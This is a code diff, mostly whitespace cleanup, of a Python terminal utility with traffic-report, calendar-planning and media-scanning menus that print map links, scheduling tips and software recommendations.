             print_header("🚦 Intelligent Traffic Report (AI-Powered)")
             print("🤖 Analyzing traffic patterns with machine learning...")
             city, lat, lon, icon, risk, report_lines = _traffic_snapshot()
-            
+
             current_hour = datetime.now().hour
             congestion_level = 50 if "HIGH" in risk else (30 if "MODERATE" in risk else 20)
-            
+
             # Get AI analysis
             traffic_flow = traffic_optimizer.analyze_traffic_patterns(current_hour, icon, congestion_level)
             recommendations = traffic_optimizer.get_traffic_recommendations(current_hour, icon, congestion_level)
-            
+
             print(f"\n {BOLD}📍 Location:{RESET} {city}")
             print(f" {BOLD}🌦️ Weather:{RESET} {icon}  {BOLD}Risk Level:{RESET} {risk}")
             print(f" {BOLD}🚗 Traffic Flow:{RESET} {traffic_flow:.1f}% {('✅ OPTIMAL' if traffic_flow > 75 else '⚠️ CAUTION' if traffic_flow > 50 else '🛑 CONGESTION')}")
-            
+
             print(f"\n{BOLD}🤖 AI Recommendations:{RESET}")
             for rec in recommendations:
                 print(f"   {rec}")
-            
+
             # Generate ASCII map
             print("\n" + _generate_ascii_traffic_map(city, lat or 0, lon or 0, congestion_level))
-            
+
             if lat is not None and lon is not None:
                 print(f"\n{BOLD}🗺️ Map Coordinates:{RESET} {lat}, {lon}")
                 print(f" {BOLD}📍 Google Maps:{RESET} https://maps.google.com/?q={lat},{lon}")
@@ -13514,7 +14733,7 @@ def feature_traffic_report():
                     "https://staticmap.openstreetmap.de/staticmap.php"
                     f"?center={lat},{lon}&zoom=12&size=600x400&maptype=mapnik"
                 )
-                
+
                 print(f"\n{BOLD}🗺️ Live Traffic Map Links:{RESET}")
                 print(f" 📍 Google Maps: https://maps.google.com/?q={lat},{lon}")
                 print(f" 🗺️ OpenStreetMap: https://osm.org/?mlat={lat}&mlon={lon}&zoom=14")
@@ -13631,27 +14850,27 @@ def feature_traffic_report():
             # Advanced Route Optimization with AI
             print_header("🌍 Advanced Route Optimization (AI-Powered)")
             print(f"\n{BOLD}Route Calculator with Traffic Prediction:{RESET}\n")
-            
+
             try:
                 from_lat = float(input("Enter starting latitude: ").strip())
                 from_lon = float(input("Enter starting longitude: ").strip())
                 to_lat = float(input("Enter destination latitude: ").strip())
                 to_lon = float(input("Enter destination longitude: ").strip())
-                
+
                 current_hour = datetime.now().hour
                 route_info = traffic_optimizer.calculate_optimal_route(from_lat, from_lon, to_lat, to_lon, current_hour)
-                
+
                 print(f"\n{BOLD}📍 Route Analysis:{RESET}")
                 print(f"  Distance: {route_info['distance_miles']} miles")
                 print(f"  Optimal Speed: {route_info['optimal_speed_mph']} mph")
                 print(f"  Estimated Time: {route_info['estimated_time_min']} minutes")
                 print(f"  Efficiency Rating: {route_info['efficiency']}%")
-                
+
                 print(f"\n{BOLD}🔗 Navigation Links:{RESET}")
                 print(f"  Google Maps: https://maps.google.com/maps?saddr={from_lat},{from_lon}&daddr={to_lat},{to_lon}")
                 print(f"  Apple Maps: http://maps.apple.com/?saddr={from_lat},{from_lon}&daddr={to_lat},{to_lon}")
                 print(f"  Waze: https://www.waze.com/ul?ll={to_lat},{to_lon}&navigate=yes")
-                
+
             except ValueError:
                 print(f"\n{COLORS['3'][0]}[!] Invalid coordinates entered{RESET}")
 
@@ -13661,7 +14880,7 @@ def feature_traffic_report():
             # Smart Driving App Recommendations
             print_header("💼 AI-Recommended Driving & Navigation Apps")
             print(f"\n{COLORS['2'][0]}Apps optimized for traffic & navigation (600% enhancement):{RESET}\n")
-            
+
             apps = {
                 "Navigation": [
                     ("Google Maps", "Real-time traffic, best routes, offline maps", "⭐⭐⭐⭐⭐"),
@@ -13685,13 +14904,13 @@ def feature_traffic_report():
                     ("Geotab", "IoT vehicle monitoring platform", "⭐⭐⭐⭐"),
                 ],
             }
-            
+
             for category, app_list in apps.items():
                 print(f"{BOLD}{category}:{RESET}")
                 for app_name, description, rating in app_list:
                     print(f"  {rating} {app_name:<20} - {description}")
                 print()
-            
+
             print(f"{BOLD}💡 AI Recommendation Engine:{RESET}")
             print("  ✅ For best traffic avoidance: Combine Waze + Google Maps")
             print("  ✅ For parking: SpotHero + ParkWhiz")
@@ -13705,32 +14924,32 @@ def feature_traffic_report():
             # AI Traffic Intelligence & Predictions
             print_header("🤖 AI Traffic Intelligence & Predictive Analytics")
             print(f"\n{COLORS['2'][0]}Machine Learning Traffic Forecasting:{RESET}\n")
-            
+
             city, lat, lon, icon, risk, _ = _traffic_snapshot()
             current_hour = datetime.now().hour
             current_day = datetime.now().strftime("%A")
-            
+
             print(f"{BOLD}📊 Current Traffic Status:{RESET}")
             print(f"  Location: {city}")
             print(f"  Time: {current_hour}:00 on {current_day}")
             print(f"  Weather: {icon}")
             print(f"  Risk Level: {risk}")
-            
+
             # AI Predictions
             congestion = 50 if "HIGH" in risk else (30 if "MODERATE" in risk else 20)
             recommendations = traffic_optimizer.get_traffic_recommendations(current_hour, icon, congestion)
-            
+
             print(f"\n{BOLD}🔮 Next 3 Hours Prediction:{RESET}")
             for i in range(1, 4):
                 pred_hour = (current_hour + i) % 24
                 pred_flow = traffic_optimizer.analyze_traffic_patterns(pred_hour, icon, congestion)
-                print(f"  +{i}h ({pred_hour}:00): {pred_flow:.1f}% flow " + 
+                print(f"  +{i}h ({pred_hour}:00): {pred_flow:.1f}% flow " +
                       ("✅ GOOD" if pred_flow > 70 else "⚠️ CAUTION" if pred_flow > 50 else "🛑 HEAVY"))
-            
+
             print(f"\n{BOLD}🤖 Smart AI Insights:{RESET}")
             for rec in recommendations:
                 print(f"  {rec}")
-            
+
             print(f"\n{BOLD}📈 Traffic Trend Analysis:{RESET}")
             print(f"  Current Flow Efficiency: {traffic_optimizer.analyze_traffic_patterns(current_hour, icon, congestion):.1f}%")
             print(f"  Peak Congestion Time: 3-6 PM (Evening Rush)")
@@ -14655,21 +15874,21 @@ class CalendarOptimizer:
         self.recurring_patterns = {}
         self.productivity_score = 0
         self.scheduling_history = []
-        
+
     def analyze_schedule_density(self, year, month):
         """Analyze how busy a month/week is"""
         cal = calendar.monthcalendar(year, month)
         events_per_week = []
         for week in cal:
             events_per_week.append(len(week))
-        
+
         avg_density = sum(events_per_week) / len(events_per_week) if events_per_week else 0
         return {
             'density': avg_density,
             'weeks': len(cal),
             'classification': self._classify_density(avg_density)
         }
-    
+
     def _classify_density(self, density):
         """Classify schedule density"""
         if density > 7:
@@ -14680,7 +15899,7 @@ class CalendarOptimizer:
             return "MODERATE"
         else:
             return "LIGHT"
-    
+
     def calculate_work_hours(self, start_hour, end_hour, work_days=5):
         """Calculate available work hours in a week"""
         hours_per_day = end_hour - start_hour
@@ -14691,15 +15910,15 @@ class CalendarOptimizer:
             'monthly_hours': total_weekly * 4.33,
             'yearly_hours': total_weekly * 52
         }
-    
+
     def find_optimal_meeting_slots(self, busy_dates, num_hours=1):
         """Find optimal meeting times avoiding busy periods"""
         suggestions = []
-        
+
         # Prefer Tuesday-Thursday, 10 AM - 12 PM
         preferred_days = [1, 2, 3]  # Tuesday, Wednesday, Thursday (0=Monday)
         preferred_hours = [10, 11]
-        
+
         for day in preferred_days:
             if day not in busy_dates:
                 for hour in preferred_hours:
@@ -14708,33 +15927,33 @@ class CalendarOptimizer:
                         'time': f"{hour}:00",
                         'confidence': 0.95
                     })
-        
+
         return suggestions[:3]  # Return top 3 suggestions
-    
+
     def estimate_project_timeline(self, tasks, hours_per_task, available_hours_weekly=40):
         """Estimate project completion timeline"""
         total_hours = len(tasks) * hours_per_task
         weeks_needed = total_hours / available_hours_weekly
         days_needed = weeks_needed * 7
-        
+
         return {
             'total_hours': total_hours,
             'weeks_to_complete': round(weeks_needed, 1),
             'days_to_complete': round(days_needed, 1),
             'tasks_per_week': round(available_hours_weekly / hours_per_task, 1)
         }
-    
+
     def generate_productivity_report(self, events_completed, events_scheduled, avg_event_duration=1):
         """Generate AI-powered productivity report"""
         completion_rate = (events_completed / events_scheduled * 100) if events_scheduled > 0 else 0
-        
+
         score_factors = {
             'on_time_completion': 40,
             'schedule_adherence': 30,
             'meeting_efficiency': 20,
             'planning_quality': 10
         }
-        
+
         return {
             'completion_rate': round(completion_rate, 1),
             'events_completed': events_completed,
@@ -14749,7 +15968,7 @@ def _generate_ascii_calendar_grid(year, month):
     """Generate ASCII calendar grid with visual indicators"""
     cal = calendar.monthcalendar(year, month)
     month_name = calendar.month_name[month]
-    
+
     grid = f"""
     ╔════════════════════════════════════════╗
     ║    {month_name.upper()} {year:<31} ║
@@ -14757,7 +15976,7 @@ def _generate_ascii_calendar_grid(year, month):
     ║ Sun  Mon  Tue  Wed  Thu  Fri  Sat     ║
     ║────────────────────────────────────────║
     """
-    
+
     for week in cal:
         week_str = "║"
         for day in week:
@@ -14767,7 +15986,7 @@ def _generate_ascii_calendar_grid(year, month):
                 week_str += f" {day:2d}  "
         week_str += "║"
         grid += week_str + "\n"
-    
+
     grid += "    ╚════════════════════════════════════════╝"
     return grid
 
@@ -14875,11 +16094,11 @@ def feature_enhanced_calendar():
 
         if choice == '0':
             return
-        
+
         if choice == '1':
             print_header("📅 Smart Calendar View (AI-Enhanced)")
             now = datetime.now()
-            
+
             months = []
             for i in range(3):
                 y, m = _add_months(now.year, now.month, i)
@@ -14913,27 +16132,27 @@ def feature_enhanced_calendar():
                 full_lines.append(left.ljust(col_width * 3 + 4) + right.ljust(panel_width))
 
             print(f"{get_current_color()}" + "\n".join(full_lines) + f"{RESET}")
-            
+
             # AI Insights
             print(f"\n{BOLD}🤖 AI Calendar Insights:{RESET}")
             density = calendar_optimizer.analyze_schedule_density(now.year, now.month)
             print(f"  Current month density: {density['classification']} ({density['density']:.1f} avg)")
             print(f"  Weeks this month: {density['weeks']}")
-            
+
             input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '2':
             print_header("📊 Schedule Analysis & Month Density")
             print(f"\n{COLORS['2'][0]}Analyzing your schedule patterns...{RESET}\n")
-            
+
             now = datetime.now()
-            
+
             print(f"{BOLD}📈 Current Month Analysis:{RESET}")
             density = calendar_optimizer.analyze_schedule_density(now.year, now.month)
             print(f"  Month Density: {density['classification']}")
             print(f"  Weeks Count: {density['weeks']}")
             print(f"  Average Density: {density['density']:.1f}/10")
-            
+
             # Next 3 months
             print(f"\n{BOLD}📅 Next 3 Months Forecast:{RESET}")
             for i in range(3):
@@ -14942,111 +16161,111 @@ def feature_enhanced_calendar():
                 density = calendar_optimizer.analyze_schedule_density(y, m)
                 emoji = "🟩" if density['classification'] == "LIGHT" else "🟨" if density['classification'] == "MODERATE" else "🟧" if density['classification'] == "BUSY" else "🟥"
                 print(f"  {emoji} {month_name}: {density['classification']}")
-            
+
             print(f"\n{BOLD}💡 AI Recommendations:{RESET}")
             print(f"  ✅ Plan major projects during LIGHT months")
             print(f"  ✅ Schedule buffer time before BUSY periods")
             print(f"  ✅ Consider vacation during transition weeks")
             print(f"  ✅ Review and reschedule conflicting events")
-            
+
             input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '3':
             print_header("⏰ AI Work Hours Calculator")
             print(f"\n{BOLD}Calculate available work hours:{RESET}\n")
-            
+
             try:
                 start = int(input("Work start hour (e.g., 9 for 9 AM): ").strip())
                 end = int(input("Work end hour (e.g., 17 for 5 PM): ").strip())
                 work_days = int(input("Work days per week (e.g., 5): ").strip())
-                
+
                 hours = calendar_optimizer.calculate_work_hours(start, end, work_days)
-                
+
                 print(f"\n{BOLD}📊 Work Hours Breakdown:{RESET}")
                 print(f"  Daily: {hours['daily_hours']} hours")
                 print(f"  Weekly: {hours['weekly_hours']} hours")
                 print(f"  Monthly: {hours['monthly_hours']:.0f} hours")
                 print(f"  Yearly: {hours['yearly_hours']:.0f} hours")
-                
+
                 print(f"\n{BOLD}🎯 Time Allocation Suggestions (Weekly):{RESET}")
                 weekly = hours['weekly_hours']
                 print(f"  🎓 Deep Work: {weekly * 0.60:.0f} hours (60%)")
                 print(f"  💬 Meetings: {weekly * 0.20:.0f} hours (20%)")
                 print(f"  📧 Admin: {weekly * 0.15:.0f} hours (15%)")
                 print(f"  🔄 Flexibility: {weekly * 0.05:.0f} hours (5%)")
-                
+
             except ValueError:
                 print(f"\n{COLORS['3'][0]}[!] Invalid input{RESET}")
-            
+
             input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '4':
             print_header("🎯 Optimal Meeting Slot Finder")
             print(f"\n{BOLD}Find best times for meetings:{RESET}\n")
-            
+
             print(f"{BOLD}🕐 Meeting Preferences:{RESET}")
             print(f"  ✅ Best: Tuesday-Thursday, 10-12 PM")
             print(f"  ⚠️  Avoid: Monday (prep), Friday PM (wrap-up)")
             print(f"  🚫 No: Before 9 AM, After 5 PM\n")
-            
+
             try:
                 num_meetings = int(input("How many meeting slots do you need? ").strip())
                 busy_dates = [int(x) for x in input("Busy dates (comma-separated, 1-31): ").split(",")]
-                
+
                 slots = calendar_optimizer.find_optimal_meeting_slots(busy_dates, num_hours=1)
-                
+
                 print(f"\n{BOLD}📅 Recommended Meeting Slots:{RESET}")
                 for i, slot in enumerate(slots[:num_meetings], 1):
                     print(f"  {i}. {slot['day']} at {slot['time']} (confidence: {slot['confidence']*100:.0f}%)")
-                
+
                 print(f"\n{BOLD}💡 Pro Tips:{RESET}")
                 print(f"  • Book adjacent slots to minimize context switching")
                 print(f"  • Include 15-min buffer before deep work blocks")
                 print(f"  • Send calendar invites 48 hours in advance")
-                
+
             except ValueError:
                 print(f"\n{COLORS['3'][0]}[!] Invalid input{RESET}")
-            
+
             input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '5':
             print_header("📈 AI Project Timeline Estimator")
             print(f"\n{BOLD}Estimate project completion time:{RESET}\n")
-            
+
             try:
                 num_tasks = int(input("Number of tasks in project: ").strip())
                 hours_per_task = float(input("Average hours per task: ").strip())
                 available_hours = float(input("Available hours per week (default 40): ").strip() or "40")
-                
+
                 timeline = calendar_optimizer.estimate_project_timeline(
-                    list(range(num_tasks)), 
-                    hours_per_task, 
+                    list(range(num_tasks)),
+                    hours_per_task,
                     available_hours
                 )
-                
+
                 print(f"\n{BOLD}📊 Project Timeline:{RESET}")
                 print(f"  Total Hours: {timeline['total_hours']:.0f}")
                 print(f"  Weeks to Complete: {timeline['weeks_to_complete']}")
                 print(f"  Days to Complete: {timeline['days_to_complete']:.0f}")
                 print(f"  Tasks per Week: {timeline['tasks_per_week']:.1f}")
-                
+
                 completion_date = datetime.now() + timedelta(days=timeline['days_to_complete'])
                 print(f"\n  🎯 Estimated Completion: {completion_date.strftime('%A, %B %d, %Y')}")
-                
+
                 print(f"\n{BOLD}⚠️  Buffer Recommendations:{RESET}")
                 buffer_days = timeline['days_to_complete'] * 0.15  # 15% buffer
                 deadline_with_buffer = datetime.now() + timedelta(days=timeline['days_to_complete'] + buffer_days)
                 print(f"  With 15% buffer: {deadline_with_buffer.strftime('%A, %B %d, %Y')}")
-                
+
             except ValueError:
                 print(f"\n{COLORS['3'][0]}[!] Invalid input{RESET}")
-            
+
             input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '6':
             print_header("📱 15+ Productivity & Calendar Apps (AI-Curated)")
             print(f"\n{COLORS['2'][0]}Recommended productivity & scheduling applications:{RESET}\n")
-            
+
             apps_categories = {
                 "🗓️ Calendar & Scheduling": [
                     ("Google Calendar", "Free, cloud-based, AI scheduling insights", "⭐⭐⭐⭐⭐"),
@@ -15080,29 +16299,29 @@ def feature_enhanced_calendar():
                     ("IFTTT", "IF This Then That automation", "⭐⭐⭐⭐"),
                 ],
             }
-            
+
             for category, apps in apps_categories.items():
                 print(f"{BOLD}{category}{RESET}")
                 for app_name, description, rating in apps:
                     print(f"  {rating} {app_name:<20} - {description}")
                 print()
-            
+
             print(f"{BOLD}🤖 AI-Recommended Stack:{RESET}")
             print(f"  📌 Core: Google Calendar + Asana + Slack")
             print(f"  ⚡ Enhancement: Calendly (scheduling) + Toggl (tracking)")
             print(f"  🎓 Optional: Notion (knowledge base) + Zapier (automation)")
             print(f"  💡 Expected productivity boost: 40-60%")
-            
+
             input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '7':
             print_header("💡 AI Productivity Insights & Tips")
             print(f"\n{BOLD}Personalized productivity recommendations:{RESET}\n")
-            
+
             tips = _get_productivity_tips()
             for i, tip in enumerate(tips, 1):
                 print(f"  {i}. {tip}")
-            
+
             print(f"\n{BOLD}📈 Productivity Framework: IMPACT Model{RESET}")
             print(f"  🎯 Intention: Start day with 3 key priorities")
             print(f"  🧩 Management: Time-block your calendar")
@@ -15110,19 +16329,19 @@ def feature_enhanced_calendar():
             print(f"  ⚡ Actions: Daily standup (15 min)")
             print(f"  💡 Capture: Weekly review (1 hour Friday)")
             print(f"  ✅ Targets: 70%+ completion rate goal")
-            
+
             print(f"\n{BOLD}🔄 Weekly Rhythm:{RESET}")
             print(f"  Mon: Planning + Strategic work")
             print(f"  Tue-Wed: Deep focus blocks")
             print(f"  Thu: Collaboration + Meetings")
             print(f"  Fri: Review + Planning next week")
-            
+
             input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '8':
             print_header("🤖 AI Smart Scheduling Assistant")
             print(f"\n{BOLD}Intelligent meeting & event scheduling:{RESET}\n")
-            
+
             print(f"{BOLD}🚀 Smart Scheduling Features:{RESET}")
             print(f"  ✅ Conflict Detection: Automatic clash prevention")
             print(f"  ✅ Time Optimization: Find shortest path scheduling")
@@ -15130,7 +16349,7 @@ def feature_enhanced_calendar():
             print(f"  ✅ Participant Analysis: Timezone adjustments")
             print(f"  ✅ Recurring Events: Pattern-based scheduling")
             print(f"  ✅ Meeting Digest: Consolidate related events")
-            
+
             print(f"\n{BOLD}📋 Schedule Types & Recommendations:{RESET}")
             schedules = {
                 "1:1 Meetings": "30 min, same day/time weekly, quiet space",
@@ -15140,23 +16359,23 @@ def feature_enhanced_calendar():
                 "Reviews": "1 hour, Friday 4 PM, prep materials",
                 "Training": "2 hours, dedicated block, minimal interrupts",
             }
-            
+
             for sched_type, recommendation in schedules.items():
                 print(f"  • {sched_type}: {recommendation}")
-            
+
             print(f"\n{BOLD}🎯 Efficiency Metrics:{RESET}")
             print(f"  Target Meeting-Free Hours: 50% of week")
             print(f"  Ideal Meeting Duration: 30-45 minutes")
             print(f"  Buffer Between Meetings: 15 minutes")
             print(f"  Focus Block Duration: 90 minutes")
             print(f"  Meeting Density Limit: 4 per day max")
-            
+
             input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '9':
             print_header("📋 Smart Event Planner & Templates")
             print(f"\n{BOLD}Pre-built event templates & planning guides:{RESET}\n")
-            
+
             templates = {
                 "Conference": {
                     "prep_weeks": 8,
@@ -15179,7 +16398,7 @@ def feature_enhanced_calendar():
                     "duration": "2 days"
                 },
             }
-            
+
             for event_name, details in templates.items():
                 print(f"📅 {BOLD}{event_name}{RESET}")
                 print(f"   Prep Time: {details['prep_weeks']} weeks")
@@ -15188,7 +16407,7 @@ def feature_enhanced_calendar():
                 for task in details['tasks']:
                     print(f"     • {task}")
                 print()
-            
+
             print(f"{BOLD}🎯 Event Planning Checklist:{RESET}")
             print(f"  ☐ Define objectives & success metrics")
             print(f"  ☐ Create detailed timeline with milestones")
@@ -15197,7 +16416,7 @@ def feature_enhanced_calendar():
             print(f"  ☐ Budget & resource allocation")
             print(f"  ☐ Risk mitigation plan")
             print(f"  ☐ Post-event review scheduled")
-            
+
             input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
 
 def feature_simple_calendar():
@@ -15377,7 +16596,7 @@ class MediaOptimizer:
         self.analysis_history = []
         self.format_support = {}
         self.playback_stats = {}
-        
+
     def analyze_media_library(self, media_files):
         """Analyze media library for comprehensive metrics"""
         stats = {
@@ -15388,26 +16607,26 @@ class MediaOptimizer:
             'duration_estimate': 0,
             'most_common_format': None
         }
-        
+
         format_count = {}
         for media in media_files:
             file_type = media.get('type', 'Unknown')
             file_size = media.get('size', 0)
             ext = media.get('extension', 'Unknown')
-            
+
             stats['total_size_mb'] += file_size
-            
+
             if file_type not in stats['by_type']:
                 stats['by_type'][file_type] = {'count': 0, 'size': 0}
-            
+
             stats['by_type'][file_type]['count'] += 1
             stats['by_type'][file_type]['size'] += file_size
-            
+
             format_count[ext] = format_count.get(ext, 0) + 1
-        
+
         stats['most_common_format'] = max(format_count, key=format_count.get) if format_count else None
         return stats
-    
+
     def estimate_quality_tier(self, file_size_mb, file_type, extension):
         """Classify media quality tier"""
         if file_type == 'Audio':
@@ -15427,7 +16646,7 @@ class MediaOptimizer:
             else:
                 return '4K (2160p+)'
         return 'UNKNOWN'
-    
+
     def recommend_player(self, file_type, extension):
         """Recommend best player for media type"""
         audio_players = {
@@ -15437,7 +16656,7 @@ class MediaOptimizer:
             '.m4a': 'iTunes, VLC, Winamp',
             '.aac': 'VLC, WinAmp, Apple Music'
         }
-        
+
         video_players = {
             '.mp4': 'VLC, MPC-HC, KMPlayer',
             '.mkv': 'VLC, MPC-HC, KMPlayer',
@@ -15446,18 +16665,18 @@ class MediaOptimizer:
             '.webm': 'VLC, Firefox, Chrome',
             '.flv': 'VLC, Media Player Classic'
         }
-        
+
         if file_type == 'Audio':
             return audio_players.get(extension, 'VLC, foobar2000')
         elif file_type == 'Video':
             return video_players.get(extension, 'VLC, MPC-HC')
         return 'Default Player'
-    
+
     def calculate_library_stats(self, stats):
         """Calculate comprehensive library statistics"""
         total_mb = stats['total_size_mb']
         total_gb = total_mb / 1024
-        
+
         calculations = {
             'storage_used_gb': round(total_gb, 2),
             'storage_used_tb': round(total_gb / 1024, 3),
@@ -15466,20 +16685,20 @@ class MediaOptimizer:
             'compression_ratio': 'Varies by format'
         }
         return calculations
-    
+
     def suggest_organization(self, media_stats):
         """AI-suggested media organization structure"""
         suggestions = []
-        
+
         if media_stats['by_type'].get('Audio', {}).get('count', 0) > 0:
             suggestions.append("📁 /Music/Artists/{Artist Name}/{Album}/{Tracks}")
-        
+
         if media_stats['by_type'].get('Video', {}).get('count', 0) > 0:
             suggestions.append("📁 /Videos/{Genre}/{Series}/{Episodes}")
-        
+
         if media_stats['by_type'].get('Images', {}).get('count', 0) > 0:
             suggestions.append("📁 /Photos/{Year}/{Month}/{Event}")
-        
+
         return suggestions
 
 media_optimizer = MediaOptimizer()
@@ -15545,7 +16764,7 @@ def _generate_ascii_media_visualization(stats):
     ║    📊 MEDIA LIBRARY VISUALIZATION      ║
     ╠════════════════════════════════════════╣
     """
-    
+
     if stats['by_type']:
         max_count = max([v['count'] for v in stats['by_type'].values()]) or 1
         for media_type, data in stats['by_type'].items():
@@ -15553,7 +16772,7 @@ def _generate_ascii_media_visualization(stats):
             bar_length = int((data['count'] / max_count) * 25)
             bar = "█" * bar_length + "░" * (25 - bar_length)
             viz += f"║ {media_type:<10} {bar} {percentage:>5.1f}%\n"
-    
+
     viz += "╚════════════════════════════════════════╝"
     return viz
 
@@ -15576,7 +16795,7 @@ def feature_enhanced_media_scanner():
 
         if choice == '0':
             return
-        
+
         if choice == '1':
             # Advanced Media Scan
             print_header("🔍 Advanced Media Directory Scanner (AI-Powered)")
@@ -15628,13 +16847,13 @@ def feature_enhanced_media_scanner():
 
                     chunk = results[start:start+page_limit]
                     total_size = 0
-                    
+
                     for i, item in enumerate(chunk, 1):
                         c = COLORS["6"][0]
                         if item["type"] == "Video": c = COLORS["3"][0]
                         elif item["type"] == "Audio": c = COLORS["5"][0]
                         elif item["type"] == "GIFs": c = COLORS["2"][0]
-                        
+
                         total_size += item["size"]
                         print(f"{BOLD}[{i}]{RESET} {c}[{item['type']:6}]{RESET} {item['name'][:40]:<40} | {item['size']:>6.1f}MB | {item['quality']}")
 
@@ -15658,7 +16877,7 @@ def feature_enhanced_media_scanner():
                 media_log = f"AI Media Scan Report\\nDirectory: {target_dir}\\nDate: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\\n"
                 media_log += f"Total Files: {stats['total_files']} | Total Size: {stats['total_size_mb']:.1f}MB\\n"
                 media_log += f"Most Common Format: {stats['most_common_format']}\\n\\n"
-                
+
                 for category in ["Audio", "Video", "Images", "GIFs"]:
                     if category in stats['by_type']:
                         info = stats['by_type'][category]
@@ -15722,27 +16941,27 @@ def feature_enhanced_media_scanner():
             # Smart Playlist Generator
             print_header("🎵 Smart Playlist Generator (AI-Enhanced)")
             target_dir = input("📂 Enter music folder: ").strip()
-            
+
             if os.path.isdir(target_dir):
                 audio_files = []
                 for root, dirs, files in os.walk(target_dir):
                     for file in files:
                         if os.path.splitext(file)[1].lower() in SUPPORTED_AUDIO_FORMATS:
                             audio_files.append(file)
-                
+
                 if audio_files:
                     print(f"\n{BOLD}🎵 Found {len(audio_files)} audio tracks{RESET}")
                     playlist_name = input("📝 Playlist name: ").strip()
-                    
+
                     playlist_content = f"# {playlist_name}\\nGenerated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\\n\\n"
                     for i, track in enumerate(audio_files[:50], 1):  # Limit to 50
                         playlist_content += f"{i}. {track}\\n"
-                    
+
                     save_log_file("media", f"Playlist_{playlist_name}", playlist_content, prompt_user=True)
                     print(f"✅ Playlist created with {min(len(audio_files), 50)} tracks")
                 else:
                     print(f"{COLORS['4'][0]}[!] No audio files found{RESET}")
-            
+
             input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
 
         elif choice == '4':
@@ -15751,43 +16970,43 @@ def feature_enhanced_media_scanner():
             print(f"\n{BOLD}🎵 For Audio Files:{RESET}")
             print(f"  Best: foobar2000, VLC, AIMP, Audacious")
             print(f"  For Lossless: foobar2000, Audacious, AIMP")
-            
+
             print(f"\n{BOLD}🎬 For Video Files:{RESET}")
             print(f"  Best: VLC, MPC-HC, KMPlayer, PotPlayer")
             print(f"  All-format Support: VLC (codec pack included)")
             print(f"  Lightweight: MPC-HC, KMPlayer")
-            
+
             print(f"\n{BOLD}🖼️ For Image Viewing:{RESET}")
             print(f"  Fast Viewer: XnView, IrfanView")
             print(f"  Professional: ACDSee, Lightroom")
-            
+
             print(f"\n{BOLD}⭐ AI-Recommended Stack:{RESET}")
             print(f"  Primary: VLC Media Player (universal)")
             print(f"  Audio: foobar2000 (advanced features)")
             print(f"  Organization: MediaMonkey (library management)")
             print(f"  Conversion: HandBrake (video transcoding)")
-            
+
             input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
 
         elif choice == '5':
             # 15+ App Ecosystem
             print_header("📱 15+ App Ecosystem (All Media Types)")
             print(f"\n{COLORS['2'][0]}Comprehensive media software recommendations:{RESET}\n")
-            
+
             recommendations = _get_media_recommendations()
             for category, apps in recommendations.items():
                 print(f"{BOLD}{category}{RESET}")
                 for app_name, description, rating, price in apps:
                     print(f"  {rating} {app_name:<25} | {description:<45} | {price}")
                 print()
-            
+
             print(f"{BOLD}🤖 AI-Recommended Essential Stack:{RESET}")
             print(f"  🎬 Core: VLC + foobar2000 + MediaMonkey")
             print(f"  🎨 Enhancement: Audacity + DaVinci Resolve")
             print(f"  🔄 Conversion: HandBrake + FFmpeg")
             print(f"  📊 Management: Plex + TagScape")
             print(f"  Expected productivity: 50%+ efficiency gain")
-            
+
             input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
 
         elif choice == '6':
@@ -15803,7 +17022,7 @@ def feature_enhanced_media_scanner():
             }
             for conv, tool in conversions.items():
                 print(f"  {conv:<20} → {tool}")
-            
+
             print(f"\n{BOLD}📽️ Video Format Conversion:{RESET}")
             v_conversions = {
                 "MKV → MP4": "HandBrake (web compatibility)",
@@ -15814,13 +17033,13 @@ def feature_enhanced_media_scanner():
             }
             for conv, tool in v_conversions.items():
                 print(f"  {conv:<20} → {tool}")
-            
+
             print(f"\n{BOLD}💡 Optimization Tips:{RESET}")
             print(f"  1. Use H.265 codec for 40-50% file size reduction")
             print(f"  2. Batch convert with HandBrake or FFmpeg")
             print(f"  3. Preserve metadata during conversion")
             print(f"  4. Test playback on target devices")
-            
+
             input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
 
         elif choice == '7':
@@ -15839,7 +17058,7 @@ def feature_enhanced_media_scanner():
   ├─ Genres/ (Alternative organization)
   └─ Playlists/
             """)
-            
+
             print(f"{BOLD}🎬 Recommended Video Structure:{RESET}")
             print(f"""
   /Videos/
@@ -15853,7 +17072,7 @@ def feature_enhanced_media_scanner():
   │  │  └─ Season 2/
   └─ Personal/
             """)
-            
+
             print(f"{BOLD}🖼️ Recommended Photo Structure:{RESET}")
             print(f"""
   /Photos/
@@ -15865,7 +17084,7 @@ def feature_enhanced_media_scanner():
   │  └─ ...
   └─ Archives/
             """)
-            
+
             input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
 
         elif choice == '8':
@@ -15881,7 +17100,7 @@ def feature_enhanced_media_scanner():
             }
             for tier, desc in audio_tiers.items():
                 print(f"  {tier:<25} {desc}")
-            
+
             print(f"\n{BOLD}🎬 Video Quality Tiers:{RESET}")
             video_tiers = {
                 "SD (480p)": "< 100MB per hour - YouTube quality",
@@ -15892,14 +17111,14 @@ def feature_enhanced_media_scanner():
             }
             for tier, desc in video_tiers.items():
                 print(f"  {tier:<25} {desc}")
-            
+
             print(f"\n{BOLD}💾 File Size Optimization:{RESET}")
             print(f"  Current size can be reduced by 30-50% using:")
             print(f"  • H.265 codec (vs H.264)")
             print(f"  • AAC audio (vs MP3)")
             print(f"  • Appropriate bitrate settings")
             print(f"  • Proper file format selection")
-            
+
             input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
 
         elif choice == '9':
@@ -15937,13 +17156,13 @@ def feature_enhanced_media_scanner():
